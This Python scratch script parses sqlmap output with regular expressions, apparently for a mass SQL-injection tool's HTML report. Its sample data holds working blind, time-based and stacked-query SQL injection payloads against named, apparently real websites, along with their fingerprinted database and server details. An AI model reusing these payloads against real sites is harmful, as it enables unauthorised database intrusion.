# -*- coding:utf-8 -*-
import re
data  = '''
[13:47:57] [INFO] fetched random HTTP User-Agent header value 'Opera/9.64 (X11; Linux x86_64; U; hr) Presto/2.1.1' from file 'D:\Langzi_Hacker\LangZi_SQL_Injection_3.7\lib\sqlmer-agents.txt'
custom injection marker ('*') found in option '-u'. Do you want to process it? [Y/n/q] Y
[13:47:57] [INFO] resuming back-end DBMS 'mysql'
[13:47:58] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: #1* (URI)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: http://www.okdy8.com:80/type/2 AND 4910=4910.html

    Type: AND/OR time-based blind
    Title: MySQL OR time-based blind (ELT)
    Payload: http://www.okdy8.com:80/type/2 OR ELT(1314=1314,SLEEP(5)).html
---
[13:47:58] [INFO] the back-end DBMS is MySQL
web application technology: Nginx, PHP 7.1.20
back-end DBMS: MySQL unknown
[13:47:58] [INFO] fetched data logged to text files under 'C:\ssers\langzi\.sqlmap\output\www.okdy8.com'

'''
result_info = re.search('---(.*?)---.*?\[INFO\] (the back-end DBMS is .*?)\[', data, re.S)
#print(result_info)
inj = result_info.group(1)
dbs = result_info.group(2)
#print(inj)

sql_param = re.search('Parameter: (.*?)  ',inj,re.S).group(1)
sql_types = re.search('Type: (.*?)  ',inj,re.S).group(1)
sql_title =  re.search('Title: (.*?)  ',inj,re.S).group(1)
sql_payload = re.search('Payload: (.*)',inj,re.S).group(1)
#print(sql_types)

inj = '''
Parameter: #1* (URI)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: http://fengchedm.com:80/content/26355' AND 8320=8320 AND 'HbeE'='HbeE.html

    Type: stacked queries
    Title: MySQL > 5.0.11 stacked queries (comment)
    Payload: http://fengchedm.com:80/content/26355';SELECT SLEEP(5)#.html

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 OR time-based blind
    Payload: http://fengchedm.com:80/content/26355' OR SLEEP(5) AND 'OGMN'='OGMN.html

'''
# print(inj.replace('Parameter: ', '<tr><td>注入参数(方式)</td><td> ').replace('Type: ', '</td></tr><tr class="active"><td>注入方式</td><td>').replace
#                 ('Title: ','</td></tr><tr><td>注入标题</td><td>').replace(
#                         'Payload: ', '</td></tr><tr><td>注入攻击</td><td>')+'</td></tr>')

dbs = '''
the back-end DBMS is Microsoft Access
web server operating system: Windows 2008 R2 or 7
web application technology: ASP.NET, Microsoft IIS 7.5, ASP
back-end DBMS: Microsoft Access
'''
# print(dbs.replace('the back-end DBMS is ', '<tr><td>数据库类型</td><td> ').replace('web server operating system: ','</td></tr><tr><td>服务器版本</td><td>').replace(
#                                 'web application technology: ', '</td></tr><tr><td>服务器语言</td><td>').replace('back-end DBMS: ', '</td></tr><tr><td>数据库版本</td><td>')+'</td></tr>')

import random
dic = {'id':[1,2,3],'html':['a','b','c']}
print(sum((dic.get('id'))))
d = [1,2,3,4,5,6]
print(random.sample(d,3))
print(1<=1)